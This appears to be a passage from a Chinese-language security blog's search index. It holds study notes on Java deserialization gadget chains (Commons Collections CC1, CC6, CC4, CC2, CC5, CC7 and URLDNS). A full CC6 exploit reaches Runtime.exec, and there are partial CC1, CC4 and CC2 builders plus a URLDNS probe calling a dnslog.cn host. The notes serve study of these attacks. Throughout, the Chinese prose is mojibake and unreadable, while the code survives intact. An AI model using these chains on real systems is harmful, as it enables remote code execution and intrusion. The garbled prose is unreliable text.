é“¾å­å†™å®Œä»¥åï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯æœ‰é‡åˆ°ä¸€äº›å‘ç‚¹çš„ï¼Œè¿™é‡Œå°±æ¥æ¢³ç†ä¸€ä¸‹ AnnotationInvocationHandlerä¸­è¦åˆ°æˆ‘ä»¬éœ€è¦çš„setvalueéƒ¨åˆ†æ˜¯å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­ï¼Œè¿™ä¸ªçš„æ„æ€æ˜¯ï¼Œmap.putç¬¬ä¸€ä¸ªå‚æ•°å€¼(â€œvalueâ€)è¦è¢«ä½œä¸ºnameï¼Œç„¶åå»çœ‹çœ‹Target.classçš„æ„é€ å‡½æ•°ä¸­æœ‰æ²¡æœ‰è¿™ä¸ªvalueå‚æ•°åï¼Œæœ‰çš„è¯æ‰èƒ½è¿›åˆ°åˆ¤æ–­é‡Œé¢å»æ‰€ä»¥è¿™é‡Œmap.putçš„å€¼éœ€è¦å–çš„æ˜¯valueï¼Œå› ä¸ºTarget.classä¸­æ˜¯æœ‰è¿™ä¸ªå‚æ•°åçš„ è¿‡äº†ä¸Šé¢çš„è¿™ä¸ªåˆ¤æ–­ä»¥åï¼Œåœ¨debugè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°é“¾å­çš„è¿™ä¸ªobjectçš„å€¼ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„Rumtime.classï¼Œè€Œæ˜¯å˜æˆäº†å¦å¤–ä¸€ä¸ªå€¼ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å¯¹ä»–è¿›è¡Œæ”¹å†™ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ConstantTransformerConstantTransformerçš„ä½œç”¨æ˜¯ï¼Œè¾“å…¥ä»€ä¹ˆå°±å›ºå®šè¾“å‡ºä»€ä¹ˆï¼Œæˆ‘ä»¬ä¸€å¼€å§‹åœ¨è¿™é‡Œè¾“å…¥Rume.classï¼Œä»–åœ¨åé¢çš„è¿”å›å€¼å½“ä¸­å°±ä¼šè¾“å‡ºè¿™ä¸ªå†…å®¹ï¼šå¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶å·²ç»è¢«æ”¹å†™ä¸ºRuntime.classäº†åˆ°è¿™é‡Œæ•´æ¡é“¾å­çš„åˆ†æå°±ç»“æŸäº†ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ ###lazymapç‰ˆCC1è¿™é‡Œè¿˜æœ‰å¦å¤–ä¸€ç§è§¦å‘æ–¹å¼ï¼Œå°±æ˜¯åˆ©ç”¨lazymapå¯ä»¥å‘ç°æœ‰å¾ˆå¤šåœ°æ–¹éƒ½ä½¿ç”¨äº†getï¼Œè¿™é‡Œç›´æ¥çœ‹ä¸€ä¸‹æ˜¯ä»å“ªé‡Œè¿›æ¥çš„ï¼Œæ ¹æ®ç½‘ä¸Šæœ‰çš„é“¾å­ï¼Œå‘ç°è¿˜æ˜¯åœ¨annotationinvocationhandlerä¸­è°ƒç”¨äº†è¿™ä¸ªgetï¼Œæ¥ä¸‹æ¥å°±çœ‹çœ‹å¦‚ä½•è§¦å‘è¿™ä¸ªinvokeinvoke ä¸»è¦æ˜¯ç”¨æ¥è°ƒç”¨æŸä¸ªç±»ä¸­çš„æ–¹æ³•çš„ï¼Œä½†æ˜¯ä»–ä¸æ˜¯é€šè¿‡å½“å‰ç±»ç›´æ¥å»è°ƒç”¨è€Œæ˜¯é€šè¿‡åå°„çš„æœºåˆ¶å»è°ƒç”¨ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥è°ƒç”¨annotationinvocationhandlerçš„æŸä¸ªæ–¹æ³•å°±è¡Œï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦çœ‹çœ‹å“ªé‡Œå¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”æœ€å¥½åœ¨readObjecté‡Œé¢ï¼Œè¿™é‡Œéœ€è¦å†çœ‹ä¸€ä¸‹è¿›å…¥åˆ°invokeé‡Œé¢çš„åˆ¤æ–­ï¼Œä¸»è¦å°±æ˜¯è¦æ— å‚æ–¹æ³•çš„æ–¹æ³•æ‰èƒ½è¿›å…¥åˆ°æœ€åçš„ï¼Œå¤§æ¦‚åˆ†æä¸€ä¸‹ï¼š1.é€šè¿‡method.getParameterTypes()è·å–æ–¹æ³•å„å‚æ•°çš„Classå¯¹è±¡ç»„æˆçš„æ•°ç»„2.å¯ä»¥å‘ç°ä¸¤ä¸ªåˆ¤æ–­è¦ç»•è¿‡çš„æ¡ä»¶å°±æ˜¯æ— å‚å³å¯å¯ä»¥å‘ç°annotaionhandlerçš„readObjectä¸­å°±å­˜åœ¨è¿™ä¸ªæ–¹æ³•äº†ï¼šä¹Ÿå°±æ˜¯ä½†æ˜¯è¦åŠ«æŒä¸€ä¸ªå¯¹è±¡å†…éƒ¨æ–¹æ³•çš„è°ƒç”¨å®ç°ç±»ä¼¼phpçš„__callæ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨javaä¸­çš„åŠ¨æ€ä»£ç†æ‰èƒ½å®ç°å³java.reflect.Proxy Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); åœ¨Proxy.newProxyInstanceçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ClassLoaderï¼Œä½¿ç”¨é»˜è®¤çš„å³å¯ï¼Œç¬¬äºŒä¸ªä¸ºæ‰€éœ€è¦ä»£ç†çš„å¯¹è±¡çš„é›†åˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“ä»£ç çš„é€»è¾‘æœ€åæ„é€ å‡ºæ¥çš„ä¸‹é¢éƒ¨åˆ†é•¿è¿™æ · HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map Lazymap = LazyMap.decorate(map,chainedTransformer);Class&lt;?&gt; b= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationInvocationhdlconstructor=b.getDeclaredConstructor(Class.class, Map.class);annotationInvocationhdlconstructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) annotationInvocationhdlconstructor.newInstance(Override.class,Lazymap);Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);Object o = annotationInvocationhdlconstructor.newInstance(Override.class,mapProxy); ###CC6å‰é¢è¯´çš„cc1æ˜¯éœ€è¦çœ‹jdkç‰ˆæœ¬ï¼Œè¿‡é«˜çš„è¯ï¼Œå‰é¢ä¸¤æ¡é“¾å­å°±æ— æ³•ä½¿ç”¨äº†ï¼Œè€Œcc6å°±æ¯”è¾ƒæ— è§†ç‰ˆæœ¬äº†é¦–å…ˆæ¥çœ‹çœ‹ä»–çš„gadget Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() å¯ä»¥å‘ç°åé¢çš„éƒ¨åˆ†è¿˜æ˜¯ä¸€æ ·ï¼Œä½¿ç”¨çš„æ˜¯LazyMapï¼Œè€Œå‰é¢çš„éƒ¨åˆ†ä½¿ç”¨äº†ä¸€ä¸ªTiedMapEntry,é‡ç‚¹æ¥è§‚å¯Ÿä¸€ä¸‹è¿™ä¸ªTiedMapEntryé‡Œé¢çš„getvalueè°ƒç”¨äº†getå‡½æ•°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†getvalueå°±å¯ä»¥äº†å¯ä»¥å‘ç°ï¼Œåœ¨hashcodeä¸­å°±è°ƒç”¨äº†è¿™ä¸ªgetvalueäº†è€Œåœ¨java.util.HashMap.hash()ä¸­è°ƒç”¨äº†è¿™ä¸ªhashcodeï¼Œç„¶ååœ¨ç»§ç»­åœ¨hashmapä¸­çš„readObjectä¸­ä½¿ç”¨è¿™ä¸ªhashï¼Œæ‰€ä»¥ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±è¡Œäº†####é”™è¯¯çš„å°è¯•è¿™é‡Œç›´æ¥åºåˆ—åŒ–map2çš„è¯æ˜¯æ²¡æœ‰ç»“æœçš„ï¼Œå› ä¸ºæ­¤æ—¶åœ¨putå€¼çš„æ—¶å€™ï¼Œputæ–¹æ³•é‡Œé¢å°±æœ‰ä¸€ä¸ªhashé‚£ä¹ˆå°±ä¼šå°†ä¸Šé¢åŸæœ¬é“¾æ¡çš„å†…å®¹èµ°å®Œäº†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å°†åŸæœ¬çš„chainedTransformerå¼„ä¸€ä¸ªå‡çš„æ”¾è¿›å»ï¼Œç„¶ååé¢å†é€šè¿‡åå°„é‡æ–°ä¼ å…¥å€¼ Class b=LazyMap.class;Field lazyfield=b.getDeclaredField(&quot;factory&quot;);lazyfield.setAccessible(true);lazyfield.set(Lazymap,chainedTransformer); ä½†æ˜¯æ­¤æ—¶ï¼Œä¹Ÿæ— æ³•å®ç°å‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºæ­¤æ—¶çš„keyå·²ç»è¢«èµ‹å€¼äº†ä½†æ˜¯åŸæœ¬æ˜¯æ²¡æœ‰çš„ï¼Œä¹Ÿæ˜¯åŒæ ·åœ¨å‰é¢çš„putè¿‡ç¨‹ä¸­è¢«èµ‹å€¼çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ç›´æ¥å°†è¿™ä¸ªkeyåˆ æ‰å°±è¡Œäº†ç„¶åå°±å¯ä»¥æˆåŠŸå‘½ä»¤æ‰§è¡Œäº†å®Œæ•´çš„paylaodå¦‚ä¸‹ package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); Class&lt;Runtime&gt; c = Runtime.class;// Method getRuntimeMethod= c.getMethod(&quot;getRuntime&quot;,null);// Runtime r= (Runtime) getRuntimeMethod.invoke(null,null);// Method execMethod = c.getMethod(&quot;exec&quot;,String.class);// execMethod.invoke(r,&quot;open /System/Applications/Calculator.app&quot;); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map Lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,&quot;a&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry,&quot;aa&quot;); Lazymap.remove(&quot;a&quot;); Class b=LazyMap.class; Field lazyfield=b.getDeclaredField(&quot;factory&quot;); lazyfield.setAccessible(true); lazyfield.set(Lazymap,chainedTransformer);// serialize(map2); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); Object obj = ois.readObject(); return obj; }} ##æ€»ç»“è¿™æ¬¡å­¦äº†javaçš„ä¸¤æ¡é“¾ï¼Œä»åå°„ç­‰åŸºç¡€çŸ¥è¯†å¼€å§‹ï¼Œåˆ°æ‰‹å†™è°ƒç”¨é“¾ï¼Œç¡®å®æ”¶è·äº†å¾ˆå¤šï¼Œæœ‰å‡ ç‚¹å›å¿†æ€»ç»“ä¸€ä¸‹1.å°è±¡æ¯”è¾ƒæ·±åˆ»çš„æ˜¯cc6ä¹Ÿå°±æ˜¯å’Œurldnsä¸€æ ·çš„åœ°æ–¹ï¼Œè¿™é‡Œéœ€è¦åå°„æ¥æ›´æ”¹å€¼ï¼Œä¸ç„¶ä¹‹å‰çš„å·²ç»è¢«putæ‰§è¡Œè¿‡ä¸€æ¬¡äº†ï¼Œå°±ä¸ä¼šå†é‡æ–°èµ°äº†2.ä½¿ç”¨proxyåŠ¨æ€ä»£ç†çš„é—®é¢˜ï¼Œå¦‚æœæ˜¯è¦è°ƒç”¨ä¸€ä¸ªå†…éƒ¨å¯¹è±¡çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±éœ€è¦åŠ¨æ€ä»£ç†","link":"/2023/01/03/javacc1/"},{"title":"java-cc4ã€cc2ã€cc5ã€cc7","text":"##cc4###ä¸ºä»€ä¹ˆéœ€è¦cc4cc4ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­æœ‰ä¸ªç±»å‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œååºåˆ—åŒ–##cc4æ„é€ cc4ä¸­ï¼Œè¿™ä¸ªç±»å®ç°äº†serializeæ¥å£ï¼Œå¹¶ä¸”åœ¨å…¶compareå‡½æ•°ä¸­å®ç°äº†transformæ–¹æ³•ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°èƒ½åˆ°è¾¾è¿™ä¸ªcompareæ–¹æ³•çš„é“¾å­å³å¯åœ¨PriorityQueueè¿™ä¸ªç±»çš„readObjectä¸­å­˜åœ¨è¿›å…¥heapifyå‡½æ•°ä¸­å¯ä»¥å‘ç°ï¼Œå‰ææ˜¯sizeåºåˆ—è¦å¤§äºç­‰äº2ï¼Œæ‰èƒ½è¿›å…¥åˆ°forå¾ªç¯ä¸­æ¥ä¸‹æ¥å†ç»§ç»­ï¼Œå°±è°ƒç”¨åˆ°äº†è¿™ä¸ªcompareå‰é¢çš„éƒ¨åˆ†å’Œä¹‹å‰çš„ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯åé¢çš„å°è£… TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformingtcon = c.getDeclaredField(&quot;transformer&quot;); transformingtcon.setAccessible(true); transformingtcon.set(transformingComparator,chainedTransformer); ##CC2å’ŒCC4çš„åŒºåˆ«ï¼šä½¿ç”¨çš„æ˜¯invoketransformer,è€Œtemplateï¼ˆä»»æ„ä»£ç æ‰§è¡Œå†…å®¹ï¼‰æ˜¯åœ¨åé¢ä¼ å…¥çš„ InvokerTransformer&lt;Object,Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;,new Class[]{},new Object[]{});TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(template);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformingtcon = c.getDeclaredField(&quot;transformer&quot;);transformingtcon.setAccessible(true);transformingtcon.set(transformingComparator,invokerTransformer); ä½†æ˜¯è¿™é‡Œå°±æŠ›å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡addçš„æ—¶å€™æ‰èƒ½å®ç°å‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºåœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­invoketransformeræ˜¯ä¸€ä¸ªæ¶ˆè€—å“ï¼Œæ­¤æ—¶å·²ç»åœ¨addçš„å…ƒç´ ä¸º1çš„æ—¶å€™è¢«æ¶ˆè€—æ‰äº†ï¼Œæ‰€ä»¥å°±è½®ä¸åˆ°templateäº†ï¼Œå’Œä¹‹å‰çš„cc6æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚ è€Œcc2å’Œå…¶ä»–çš„é“¾å­æœ€å¤§ä¸€ä¸ªåŒºåˆ«æ˜¯è¿™é‡Œæ²¡æœ‰ç”¨åˆ°æ•°ç»„çš„å¤„ç†æ–¹å¼ï¼ˆä¹Ÿå°±æ˜¯chainedtransformerï¼‰ï¼Œå› æ­¤åœ¨æœ‰äº›æ•°ç»„åŠ è½½ä¸åˆ°çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨cc2 ##cc5cc5å’Œå…¶ä»–åŒºåˆ«ä¸»è¦æ˜¯åœ¨Lazymapçš„getæ–¹æ³•çš„è°ƒç”¨é“¾ä¸­ï¼Œä½¿ç”¨çš„æ˜¯å…¶ä»–ç±»æ¥è§¦å‘getæ–¹æ³•ï¼Œï¼šBadAttributeValueExpException.readObject-&gt;TiedMapEntry.toStringæ‰€ä»¥å¦‚æœé‡åˆ°toStringæ–¹æ³•çš„æ—¶å€™å¯ä»¥ç”¨cc5æ¥è¿›è¡Œæ„é€  ##cc7Hashtable.readObject -&gt; AbstractMap.equals-&gt;xx.getè¿™é‡Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯è¿™ä¸ªequalsæ˜¯æœ‰ç‚¹ç»§æ‰¿çš„æ„å‘³åœ¨é‡Œé¢ï¼Œå‘ä¸Šç»§æ‰¿æ‰ç”¨åˆ°çš„","link":"/2023/01/12/javacc4/"},{"title":"javaå®‰å…¨åŸºç¡€çŸ¥è¯†","text":"##javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å…¶å®å’Œphpçš„ç±»ä¼¼ï¼Œç”Ÿæˆåºåˆ—åŒ–å†…å®¹ï¼Œç„¶åååºåˆ—åŒ–åºåˆ—æ•°æ®ã€‚å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ç‚¹äº‹éœ€è¦æ³¨æ„çš„ Java åºåˆ—åŒ–æ˜¯æŒ‡æŠŠ Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ObjectOutputStreamç±»çš„ writeObject() æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ– Java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸º Java å¯¹è±¡çš„è¿‡ç¨‹ObjectInputStream ç±»çš„ readObject() æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚ æ˜¯å¦å…·æœ‰serializeç»“æ„ï¼ˆImplements Serializableï¼‰ transientè¡¨ç¤ºçš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ– å¦‚æœè¯¥ç±»çš„æŸä¸ªå±æ€§æ ‡è¯†ä¸ºstaticç±»å‹çš„ï¼Œåˆ™è¯¥å±æ€§ä¸èƒ½åºåˆ—åŒ–ã€‚ å¦‚æœå¯¹ç§æœ‰æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–æ›´æ”¹å€¼çš„æ—¶å€™éœ€è¦ä½¿ç”¨åå°„ æ¥ä¸‹æ¥çœ‹çœ‹demoè¿™é‡Œå†™äº†ä¸€ä¸ªjavaç±» import java.io.Serializable;public class person implements Serializable{ private String name; public person(String name){#personç±»çš„æ„é€ æ–¹æ³• this.name = name; } public String toString(){ #è¿™é‡Œé‡å†™äº†toStringæ–¹æ³• return &quot;person{&quot;+ &quot;{name:&quot;+name+&quot;}&quot;; } public void setname(String name){ #è¿™æ˜¯ä»–çš„é™æ€æ–¹æ³• this.name=name; } public String getName(){ #æœ‰è¿”å›å€¼çš„æ–¹æ³• return name; }} åœ¨è¿™é‡Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–,ä¸»è¦ä½¿ç”¨ObjectOutputStreamå¯¼å…¥åºåˆ—åŒ–æµ import java.io.*;public class Main { public static void serialize(final Object obj) throws Exception{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); serialize(p); }} åœ¨è¿™é‡Œå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–è€Œæœ€åçš„printlnä¼šè°ƒç”¨toStringæ–¹æ³• import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class Unserializetest { public static Object unsetialize(String Filename) throws IOException,ClassNotFoundException{ ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } public static void main(String[] args) throws Exception{ person pe = (person) unsetialize(&quot;ser.bin&quot;); System.out.println(pe); }} ##javaååºåˆ—åŒ–å®‰å…¨é—®é¢˜javaååºåˆ—åŒ–å’Œphpååºåˆ—åŒ–ç±»ä¼¼ï¼Œéƒ½æ˜¯å»å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»å’Œæ–¹æ³•ï¼Œjavaååºåˆ—åŒ–æ—¶å³ä¼šè°ƒç”¨readObject###åˆ©ç”¨æ¡ä»¶ ååºåˆ—åŒ–ç‚¹è¾“å…¥å¯æ§ ä½¿ç”¨readObjectå‡½æ•°æ‰§è¡Œååºåˆ—åŒ– å½“å‰classç©ºé—´ä¸­å­˜åœ¨ä¸€ä¸ªå¯å¤å†™readObjectçš„ç±» å¯åˆ©ç”¨å½“å‰ç¯å¢ƒä¸‹çš„readObjectè¿›ä¸€æ­¥æ„ç­‘åˆ©ç”¨é“¾###åˆ©ç”¨å½¢å¼ readObjectä¸­æœ‰å¯æ§å±é™©æ–¹æ³• å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨ å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨###é‡å†™readObjectæ–¹æ³• è¿™é‡Œå°±è¿˜æ˜¯ä¸¾ä¸€ä¸ªdemoï¼š private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);} é‡æ–°åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–å³å¯å¼¹å‡ºè®¡ç®—å™¨ ####ä¸ºä»€ä¹ˆreadObjectå‡½æ•°éœ€è¦privateå±æ€§ï¼Œä¼ å‚java.io.ObjectInputStreamï¼Ÿ è¿™ä¸ªæ–‡ç« é‡Œé¢å†™äº†å¯¹æ¯”readObjecté‡å†™è§£é‡Šæ€»ç»“æ¥è¯´å°±æ˜¯ï¼š æˆ‘ä»¬å…¶å®ä¸æ˜¯é‡å†™äº†readObjectï¼Œè€Œæ˜¯åˆ©ç”¨ä¼ å…¥çš„å‚æ•°ä¸åŒï¼Œä½¿å¾—å…¶èƒ½è¢«é‡æ–°èµ‹å€¼ï¼Œæ‰§è¡Œè¢«å¤å†™çš„å‚æ•°ï¼Œè¿™å°±å›ç­”äº†æ ‡é¢˜çš„é—®é¢˜äº† è€Œè¿™ä¸ªæ¡ä»¶é¦–å…ˆéœ€è¦æ–¹æ³•åä¸ºreadObject è¿”å›ç±»å‹ä¸ºvoid ä¼ å…¥å‚æ•°ä¸ºObjectInputStream.classç±»å‹å‚æ•° ä¿®é¥°ç¬¦ä¸èƒ½åŒ…å«static ä¿®é¥°ç¬¦å¿…é¡»åŒ…å«private###åˆ©ç”¨å¯æ§ç±»æ‰§è¡Œå‘½ä»¤####URLDNSé“¾æ„é€ é“¾ï¼šHashMap.readObject-&gt;HashMap.hash-&gt;URl.hashcode-&gt;URL.getHostAddressè¿™é‡Œç®€è¦åˆ†æä¸€ä¸‹pocï¼š javaåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨readObjectï¼Œå¦‚æœæ­¤ç±»é‡å†™äº†readObjectåˆ™ä¼šè°ƒç”¨è¯¥ç±»é‡å†™ä»¥åçš„ åœ¨HashMapä¸­é‡å†™äº†readObjectï¼Œå¹¶ä¸”è°ƒç”¨äº†hash(key) è·Ÿè¿›hash(key),å‘ç°å…¶è°ƒç”¨äº†hashCodeæ–¹æ³• è€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è·ŸURLçš„hashCodeæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±è§¦å‘getHostAddressï¼Œè®¿é—®dnslogé“¾æ¥ public static void main(String[] args) throws Exception{ HashMap&lt;URL,Integer&gt; hashmap= new HashMap&lt;URL,Integer&gt;(); URL url = new URL(&quot;http://25x9gm.dnslog.cn/&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,1234); hashmap.put(url,1); hashcodefield.set(url,-1); serialize(hashmap);} æ¥ä¸‹æ¥è°ˆè°ˆå¦‚ä½•ä¹¦å†™è¿™ä¸ªååºåˆ—åŒ–é“¾æ¡1.ç¡®å®šæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¦å®ä¾‹åŒ–çš„ç±»ï¼Œå¾ˆæ˜ç¡®è¿™é‡Œå°±æ˜¯HashMapï¼Œæ¥ä¸‹æ¥éœ€è¦ç ”ç©¶ä¸€ä¸‹ï¼Œå¦‚ä½•ä¼ å…¥æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°readObjectä¸­ï¼Œæœ€åä½¿ç”¨çš„æ˜¯put","link":"/2022/12/15/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"javaåŸºç¡€è¯­æ³•","text":"##javaåŸºç¡€è¯­æ³•###é‡å†™ å‚æ•°åˆ—è¡¨ä¸è¢«é‡å†™æ–¹æ³•çš„å‚æ•°åˆ—è¡¨å¿…é¡»å®Œå…¨ç›¸åŒã€‚ è¿”å›ç±»å‹ä¸è¢«é‡å†™æ–¹æ³•çš„è¿”å›ç±»å‹å¯ä»¥ä¸ç›¸åŒï¼Œä½†æ˜¯å¿…é¡»æ˜¯çˆ¶ç±»è¿”å›å€¼çš„æ´¾ç”Ÿç±»ï¼ˆjava5 åŠæ›´æ—©ç‰ˆæœ¬è¿”å›ç±»å‹è¦ä¸€æ ·ï¼Œjava7 åŠæ›´é«˜ç‰ˆæœ¬å¯ä»¥ä¸åŒï¼‰ã€‚ è®¿é—®æƒé™ä¸èƒ½æ¯”çˆ¶ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•çš„è®¿é—®æƒé™æ›´ä½ã€‚ä¾‹å¦‚ï¼šå¦‚æœçˆ¶ç±»çš„ä¸€ä¸ªæ–¹æ³•è¢«å£°æ˜ä¸º publicï¼Œé‚£ä¹ˆåœ¨å­ç±»ä¸­é‡å†™è¯¥æ–¹æ³•å°±ä¸èƒ½å£°æ˜ä¸º protectedã€‚ çˆ¶ç±»çš„æˆå‘˜æ–¹æ³•åªèƒ½è¢«å®ƒçš„å­ç±»é‡å†™ã€‚ å£°æ˜ä¸º final çš„æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€‚ å£°æ˜ä¸º static çš„æ–¹æ³•ä¸èƒ½è¢«é‡å†™ï¼Œä½†æ˜¯èƒ½å¤Ÿè¢«å†æ¬¡å£°æ˜ã€‚ å­ç±»å’Œçˆ¶ç±»åœ¨åŒä¸€ä¸ªåŒ…ä¸­ï¼Œé‚£ä¹ˆå­ç±»å¯ä»¥é‡å†™çˆ¶ç±»æ‰€æœ‰æ–¹æ³•ï¼Œé™¤äº†å£°æ˜ä¸º private å’Œ final çš„æ–¹æ³•ã€‚ å­ç±»å’Œçˆ¶ç±»ä¸åœ¨åŒä¸€ä¸ªåŒ…ä¸­ï¼Œé‚£ä¹ˆå­ç±»åªèƒ½å¤Ÿé‡å†™çˆ¶ç±»çš„å£°æ˜ä¸º public å’Œ protected çš„é final æ–¹æ³•ã€‚ é‡å†™çš„æ–¹æ³•èƒ½å¤ŸæŠ›å‡ºä»»ä½•éå¼ºåˆ¶å¼‚å¸¸ï¼Œæ— 